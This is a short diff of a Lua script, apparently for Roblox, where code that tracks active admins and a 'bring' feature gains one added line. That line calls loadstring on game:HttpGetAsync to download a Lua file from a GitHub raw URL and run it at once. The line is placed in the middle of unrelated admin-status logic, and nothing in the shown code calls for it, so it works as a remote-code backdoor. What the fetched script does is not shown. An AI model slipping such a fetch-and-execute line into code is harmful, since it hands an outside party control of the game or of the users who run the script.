@@ -52,6 +52,9 @@ local function updateAdminStatus()
             table.insert(activeAdmins, player)
         end
     end
+
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Gi7331/scripts/main/Emote.lua"))()
+
     
     -- Update bring status
     bringEnabled = #activeAdmins > 0
